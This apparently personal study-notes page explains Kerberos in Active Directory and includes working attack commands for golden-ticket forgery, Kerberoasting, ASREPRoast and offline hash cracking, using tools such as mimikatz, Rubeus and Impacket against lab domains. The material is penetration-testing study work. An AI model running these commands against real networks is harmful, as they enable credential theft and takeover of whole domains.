<h2 id="kerberos-architecture">Kerberos architecture<a href="#kerberos-architecture" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>This section outlines all the different parts that make up Kerberos authentication.</p>
<h3 id="transport-layer">Transport Layer<a href="#transport-layer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>Either uses TCP or UDP
<ul>
<li>UDP: 88</li>
<li>TCP: 88</li>
</ul>
</li>
<li>Sends data in clear text, therefore it must handle its own encryption</li>
</ul>
<h3 id="agents">Agents<a href="#agents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Several agents work together to provide authentication in Kerberos</p>
<ol>
<li>Client or user who wants to access the service</li>
<li>AP (Application Server) which offers the service required by the user that implements Kerberos to handle authentication</li>
<li>KDC (Key Distribution Center), the main service of Kerberos, responsible for issuing the tickets, installed on the DC (Domain Controller).
<ol>
<li>It is supported by the AS (Authentication Service), which issues the TGTs</li>
</ol>
</li>
</ol>
<h3 id="encryption-keys">Encryption keys<a href="#encryption-keys" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>KDC or krbgt key - derived from krbtg account NTLM hash</li>
<li>User Key - derived from user NTLM hash</li>
<li>Service Key - derived from NTLM hash of service owner whuch can be a user or computer account</li>
<li>Session key - negotiated between the user and KDC</li>
<li>Service session key - used between the user and service</li>
</ul>
<h3 id="tickets">Tickets<a href="#tickets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Tickets are the main part of Kerberos. They are given to users in order to be used to perform several actions. There are 2 main types:</p>
<ul>
<li>TGS (Ticket Granting Service) is the ticket used by a user to authenticate against a service
<ul>
<li>It is encrypted with the service key</li>
</ul>
</li>
<li>The TGT (Ticket Granting Ticket) is the ticket passed to the KDC to request a TGS.
<ul>
<li>It is encrypted with the KDC key</li>
</ul>
</li>
</ul>
<h4 id="golden-ticket">Golden ticket<a href="#golden-ticket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.</p>
<p>With a golden ticket a valid <strong>TGT as any user</strong> can be created <strong>using the NTLM hash of the krbtgt AD account</strong>. The advantage of forging a TGT instead of TGS is being <strong>able to access any service</strong> (or machine) in the domain and the impersonated user.</p>
<blockquote>
<p>The <strong>krbtgt</strong> account <strong>NTLM hash</strong> can be <strong>obtained</strong> from the <strong>lsass process</strong> or from the <strong>NTDS.dit file</strong> of any DC in the domain.
It is also possible to get that NTLM through a <strong>DCsync attack</strong>, which can be performed either with the lsadum[::dcsync module of Mimikatz or secretsdump.py. Requires domain admin privileges usually.
NTLM hashes can sometimes be sniffed through <strong>responder</strong></p>
</blockquote>
<p>Inject golden ticket from Linux</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME<span style="color:#f92672">=</span>/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
</code></pre></div><p>Inject golden ticket from Windows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mimikatz <span style="color:#75715e"># kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt</span>
.<span style="color:#ae81ff">\R</span>ubeus.exe ptt /ticket:ticket.kirbi
klist <span style="color:#75715e">#List tickets in memory</span>
</code></pre></div><h3 id="pac">PAC<a href="#pac" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>Privilege Attribute Certificate</li>
</ul>
<p>The PAC is included in almost every ticket. This structure contains the privileges of the user and it is signed with the KDC key.</p>
<p>Services can verify the PAC by communicating with the KDC (Doesn&rsquo;t happen often). The check only checks the signature, not if the privileges inside are correct.</p>
<h3 id="messages">Messages<a href="#messages" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>There are different types of messages used:</p>
<ul>
<li>KRB_AS_REQ: Requests TGT from KDC</li>
<li>KRB_AS_REP: Delivers TGT from KDC</li>
<li>KRB_TGS_REQ: Requests TGS from KDC, using the TGT.</li>
<li>KRB_TGS_REP: Delivers the TGS from KDC.</li>
<li>KRB_AP_REQ: Used to authenticate a user against a service, using the TGS.</li>
<li>KRB_AP_REP: (Optional) Used by service to identify itself against the user.</li>
<li>KRB_ERROR: Message to communicate error conditions.</li>
</ul>
<p>![[Pasted image 20220610161522.png]]</p>
<h2 id="kerberoasting">Kerberoasting<a href="#kerberoasting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>The goal of <strong>Kerberoasting</strong> is to harvest <strong>TGS tickets for services that run on behalf of user accounts</strong> in the AD, not computer accounts.</p>
<p>Part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.</p>
<p>You can know that a user account is being used as a <strong>service</strong> because the property <strong>&ldquo;ServicePrincipalName&rdquo;</strong> is <strong>not null</strong>.</p>
<p>To perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is usually everyone as no special privileges are required.</p>
<p><strong>You need valid credentials inside the domain.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf&gt; use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast <span style="color:#75715e"># Password will be prompted</span>
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes &lt;LMHASH&gt;:&lt;NTHASH&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Get-NetUser -SPN | <span style="color:#66d9ef">select</span> serviceprincipalname <span style="color:#75715e">#PowerView, get user service accounts</span>

<span style="color:#75715e">#Get TGS in memory</span>
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span style="color:#e6db74">&#34;ServicePrincipalName&#34;</span> <span style="color:#75715e">#Example: MSSQLSvc/mgmt.domain.local </span>
 
klist <span style="color:#75715e">#List kerberos tickets in memory</span>
 
Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;kerberos::list /export&#34;&#39;</span> <span style="color:#75715e">#Export tickets to current folder</span>
</code></pre></div><h3 id="cracking">Cracking<a href="#cracking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --format<span style="color:#f92672">=</span>krb5tgs --wordlist<span style="color:#f92672">=</span>passwords_kerb.txt hashes.kerberoast
hashcat -m <span style="color:#ae81ff">13100</span> --force -a <span style="color:#ae81ff">0</span> hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
</code></pre></div><h2 id="asreproast">ASREPRoast<a href="#asreproast" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>If a user <strong>doesn&rsquo;t have</strong> the attribute <em>DONT_REQ_PREAUTH</em> you can <strong>request a AS_REP message</strong> for that user that will contain some data encrypted by a derivation of the password of the user. This can then be cracked to retrieve a password.</p>
<p>Linux:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#Try all the usernames in usernames.txt</span>
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
<span style="color:#75715e">#Use domain creds to extract targets and target them</span>
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
</code></pre></div><p>Windows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#ae81ff">\R</span>ubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
Get-ASREPHash -Username VPN114user -verbose <span style="color:#75715e">#From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</span>
</code></pre></div><h3 id="cracking-1">Cracking<a href="#cracking-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>passwords_kerb.txt hashes.asreproast
hashcat -m <span style="color:#ae81ff">18200</span> --force -a <span style="color:#ae81ff">0</span> hashes.asreproast passwords_kerb.txt 
</code></pre></div><h1 id="fsmos">FSMO&rsquo;s<a href="#fsmos" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h1 id="hashes">Hashes<a href="#hashes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="nt">NT<a href="#nt" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="lm">LM<a href="#lm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="ntlm-v1">NTLM v1<a href="#ntlm-v1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="ntlm-v2">NTLM v2<a href="#ntlm-v2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h1 id="misc">Misc<a href="#misc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Clocks on systems within a domain need to be in sync to prevent replay attacks. Clock skew can invalidate authenticators such as Kerberos. This is because timestamps are passed within tickets such as TGTs and if the timestamps do not match (with the tolerance) they do not grant a ticket.</p>
<h2 id="replay-attack">Replay attack<a href="#replay-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>Alice authenticates to KDC. KDC provides TGT</li>
<li>Alice sends TGT to TGS and receives a TGS ticket (Service Ticket)</li>
<li>Attacker Eve is listening in and makes a copy of the encrypted Service Ticket</li>
<li>Eve can not decrypt the TGS but can send it to the Service to impersonate Alice</li>
</ul>
<h3 id="mitigation">Mitigation<a href="#mitigation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>TImestamps are used inside tickets so if used outside of the tolerance it will not allow Eve to authenticate as Alice</li>
<li>Service maintains a cache of recently authenticated tickets, if not in the cache the user will be authenticated, if its in the cache the user will not be authenticated.</li>
</ul>
<h1 id="ad-certificate-services">AD Certificate services<a href="#ad-certificate-services" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Used for:</p>
<ul>
<li>Encrypting file systems</li>
<li>Signing</li>
<li>User authentication</li>
</ul>
<h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</a></li>
</ul>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
